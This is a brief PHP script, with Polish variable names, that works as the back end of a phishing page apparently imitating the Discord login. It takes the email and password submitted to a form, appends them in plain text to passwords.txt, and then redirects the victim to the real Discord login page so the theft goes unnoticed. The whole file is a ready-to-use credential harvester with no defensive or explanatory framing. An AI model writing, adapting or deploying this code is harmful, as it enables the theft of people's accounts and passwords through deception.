<?php
$email = $_POST['email'];
$password = $_POST['password'];
$dane = "Email: $email Hasło: $password\n\r";
$uchwyt = fopen("passwords.txt", "a");
fwrite($uchwyt, $dane);
fclose($uchwyt);
header("Location: https://discord.com/login")
?>
